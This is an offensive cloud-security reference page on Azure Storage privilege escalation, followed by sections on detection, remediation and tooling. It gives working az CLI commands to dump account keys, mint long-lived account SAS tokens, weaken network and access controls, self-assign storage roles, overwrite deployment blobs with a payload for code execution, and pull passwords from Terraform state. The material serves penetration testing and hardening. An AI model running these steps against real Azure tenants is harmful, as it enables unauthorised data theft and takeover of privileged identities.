---
cstg_id: CSTG-AZURE-STORAGE-ACCOUNTS-PRIVESC
title: "AZURE Storage Accounts - Privilege Escalation"
provider: azure
service: storage-accounts
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - Microsoft.Storage/storageAccounts/listKeys/action
  - Microsoft.Storage/storageAccounts/regeneratekey/action
  - Microsoft.Storage/storageAccounts/listAccountSas/action
  - Microsoft.Storage/storageAccounts/write
  - Microsoft.Storage/storageAccounts/blobServices/containers/write
  - Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write
  - Microsoft.Authorization/roleAssignments/write
tools: [azure-cli, az-powershell, MicroBurst, ScoutSuite, BloodHound]
references:
  - "https://learn.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage"
  - "https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#storage"
  - "https://hackingthe.cloud/azure/exploitation/azure-storage-account-keys/"
  - "https://learn.microsoft.com/en-us/rest/api/storagerp/storage-accounts/list-keys"
license: CC BY-SA 4.0
---

## Summary

Azure Storage contributes to privilege escalation in two ways: by abusing **control-plane permissions**
on the account (listing keys, regenerating keys, minting account SAS, granting RBAC) to obtain
root-equivalent data access that bypasses Entra RBAC and most identity logging; and by abusing
**write access to blobs that other systems trust** - deployment artifacts, ARM/Bicep/Terraform state,
bootstrap scripts, function code, and configuration that a more-privileged identity later executes.
Account keys are the linchpin: a single `listKeys` call yields a non-expiring, full-control credential
for every container, share, queue, and table in the account. This page is keyed by the permission
that enables each path, assuming an initial low-privilege principal (assumed-breach). Confirm
effective permissions first via
[Azure Storage Accounts - Enumeration](../02-services/azure-storage-accounts-enum.md).

## Prerequisites

A principal holding one or more of the permissions below over a target storage account, plus the
ability to reach the relevant endpoint (account not firewalled off, or access from an allowed
network/private endpoint). Attack-path tooling (BloodHound for Azure, ScoutSuite) can highlight which
accounts the current principal can read keys from or write blobs to.

```bash
# What can this principal do against storage in this scope?
az account get-access-token >/dev/null && az ad signed-in-user show 2>/dev/null
ACCT_ID=$(az storage account show -n <acct> -g <rg> --query id -o tsv)
az role assignment list --assignee <objectId> --scope "$ACCT_ID" --include-inherited -o table
```

## Exploitation

### `Microsoft.Storage/storageAccounts/listKeys/action`

The highest-frequency path. `listKeys` returns the two account keys, each a root-equivalent shared
secret granting full read/write/delete across **all** containers, shares, queues, and tables -
bypassing Entra RBAC and per-container access levels entirely. The key works even when
`allowBlobPublicAccess` is false and regardless of which data-plane roles the principal holds.

```bash
# Retrieve the keys (control-plane permission only - no data-plane role needed)
KEY=$(az storage account keys list -n <acct> -g <rg> --query '[0].value' -o tsv)

# Use the key for full data-plane access, ignoring RBAC
az storage container list --account-name <acct> --account-key "$KEY" -o table
az storage blob download --account-name <acct> --account-key "$KEY" \
  --container-name <ctr> --name secrets.json --file /tmp/secrets.json
```

Because shared-key requests carry no Entra identity, the actor recorded in data-plane logs is the
key, not the principal - obscuring attribution. The key persists until manually regenerated.

### `Microsoft.Storage/storageAccounts/listAccountSas/action`

Mint an **account-level SAS** with full permissions and a long expiry. Account SAS spans all services
and resource types and, like a key, bypasses RBAC. This is a stealthier alternative to dumping the
raw key and produces a self-contained, portable credential.

```bash
az storage account generate-sas --account-name <acct> \
  --services bqtf --resource-types sco --permissions racwdlup \
  --expiry 2099-01-01T00:00:00Z --https-only -o tsv
# Use the returned token directly against any endpoint of the account
curl -s "https://<acct>.blob.core.windows.net/<ctr>?restype=container&comp=list&<SAS>"
```

### `Microsoft.Storage/storageAccounts/regeneratekey/action`

Where `listKeys` is denied but key regeneration is allowed, **regenerate** a key to learn its new
value (the API returns the regenerated key set). This is destructive - it invalidates the prior key
and breaks anything using it - so it is in scope only with explicit authorisation, but it yields the
same root-equivalent credential as `listKeys`.

```bash
az storage account keys renew -n <acct> -g <rg> --key key2   # returns the new key value
```

### `Microsoft.Storage/storageAccounts/write`

Account-write lets you weaken the account's own controls to open a path:

- Set **`allowSharedKeyAccess = true`** (if previously disabled) to re-enable the key/SAS attack
  surface, then list/regenerate keys.
- Set **`allowBlobPublicAccess = true`** and flip a container to public to exfiltrate anonymously.
- Set **`networkRuleSet.defaultAction = Allow`** to remove the firewall and reach the data plane from
  anywhere.

```bash
az storage account update -n <acct> -g <rg> --allow-shared-key-access true
az storage account update -n <acct> -g <rg> --default-action Allow
az storage account update -n <acct> -g <rg> --allow-blob-public-access true
```

### `Microsoft.Authorization/roleAssignments/write` (on a storage scope)

If the principal can create role assignments scoped to the account, grant itself a
**`Storage Blob Data Owner`** (or `Storage Account Contributor`, which includes `listKeys`) role and
obtain durable, Entra-authenticated data access - or full key access.

```bash
az role assignment create --assignee <attacker-objectId> \
  --role "Storage Blob Data Owner" --scope "$ACCT_ID"
# or, to gain listKeys:
az role assignment create --assignee <attacker-objectId> \
  --role "Storage Account Contributor" --scope "$ACCT_ID"
```

### `...blobServices/containers/blobs/write` on a trusted/deployment container (code execution)

The highest-impact data-plane path. If a container holds artifacts that a privileged identity
executes, overwrite them and wait for (or trigger) execution under that identity:

- **Function App / WebJobs deployment container** (`function-releases`, `scm-releases`,
  `azure-webjobs-hosts`) - replace the deployment package; the code runs under the app's
  managed identity on next start/restart.
- **ARM / Bicep / Terraform templates and state** stored in blobs - inject a resource, a
  `deploymentScript`, or VM `customData`/extension that runs under the deploying identity. State
  files (`terraform.tfstate`) often also contain plaintext secrets (credential access).
- **VM custom-script / bootstrap blobs and cloud-init** pulled from storage - overwrite the script;
  it executes as root/SYSTEM on next boot under the VM's managed identity.
- **Automation runbooks / DSC configurations** staged in storage - overwrite to run under the
  Automation account's identity.
- **Static website / app assets (`$web`)** - overwrite JS/HTML for stored XSS or client-side
  supply-chain compromise.

```bash
az storage blob upload --account-name <acct> --auth-mode login \
  --container-name function-releases --name app.zip --file ./payload.zip --overwrite
```

### `...containers/blobs/read` on sensitive containers (credential access)

Reading the right blob yields credentials or state that escalate access directly:
`terraform.tfstate` / `*.tfstate.backup`, `.env`, CI/CD config, `kubeconfig`, PFX/PEM private keys,
connection strings, backup archives, and VM disk (`.vhd`) snapshots.

```bash
az storage blob download --account-name <acct> --auth-mode login \
  --container-name tfstate --name prod.tfstate --file - | jq '.. | .password? // empty'
```

## Misconfigurations & Findings

- `listKeys` / `regeneratekey` granted broadly (via `Contributor`, `Storage Account Contributor`, or
  custom roles) to identities that do not administer storage.
- `allowSharedKeyAccess = true`, leaving key/SAS as a standing RBAC-bypass primitive.
- Account-level SAS minting permitted to non-admins; long-lived/over-scoped SAS in use.
- Write access to deployment, IaC, function, or bootstrap containers granted broadly, without
  versioning/immutability so artifacts can be silently overwritten.
- `roleAssignments/write` at storage or higher scope held by non-admins (self-grant path).
- Account-write held by non-admins, allowing controls (`allowSharedKeyAccess`, network rules, public
  access) to be reverted.

## Detection & Logging

`ListKeys`, `RegenerateKey`, `listAccountSas`, account `write` (control changes), and
`roleAssignments/write` are all **Azure Activity Log** management events on the account resource;
`listKeys`/`regeneratekey` and any change to `allowSharedKeyAccess`/network rules should be alerted
on for sensitive accounts, and the calling identity is visible in **Entra ID sign-in/audit logs**.
Blob read/write is recorded only when **diagnostic logging** (StorageRead/StorageWrite) is enabled;
overwrite-for-execution attacks are otherwise invisible. Crucially, requests using an **account key
or account SAS carry no Entra identity**, so correlate the control-plane `listKeys`/SAS-mint event
with the subsequent anonymous-looking data-plane activity and the downstream
function/VM/deployment execution. **Microsoft Defender for Storage** flags access from leaked keys
and anomalous data operations.

## Remediation & Hardening

- Set **`allowSharedKeyAccess = false`** so keys and account SAS cannot authorise data access;
  authorise the data plane via **Entra ID RBAC** only.
- Restrict `listKeys`/`regeneratekey` to a dedicated admin role; deny it elsewhere via **Azure Policy**
  and audit all holders. Prefer **user-delegation SAS** (Entra-backed, revocable) over account SAS.
- Enforce a **key rotation policy** and rotate after any suspected exposure (regeneration invalidates
  leaked keys).
- Apply **least-privilege data-plane RBAC**; restrict `roleAssignments/write` to PIM-gated admins.
- Lock down deployment/IaC/function containers: least-privilege write, **blob versioning + immutability
  (WORM) policies**, and access only by the CI/CD identity.
- Keep secrets out of blobs (use **Key Vault**); never store IaC state with plaintext secrets.
- Use **deny network rules + private endpoints** and enable **diagnostic logging** and **Defender for
  Storage** with alerting on key operations.

## Tools

- **azure-cli** / **az-powershell** - perform and verify each path (`keys list/renew`,
  `generate-sas`, `account update`, `role assignment create`, `blob upload/download`).
- **MicroBurst** - automates subscription-wide key dumping and SAS enumeration (active/intrusive -
  requires explicit rules of engagement).
- **BloodHound (Azure)**, **ScoutSuite** - identify which accounts the current principal can read keys
  from, write blobs to, or self-assign roles on, and map the resulting attack paths.

## References

- Microsoft Learn - Manage storage account access keys
- Microsoft Learn - Grant limited access with shared access signatures (SAS)
- Microsoft Learn - Azure built-in roles (Storage)
- Microsoft Learn - Storage Accounts - List Keys (REST API)
- hackingthe.cloud - Abusing Azure storage account keys
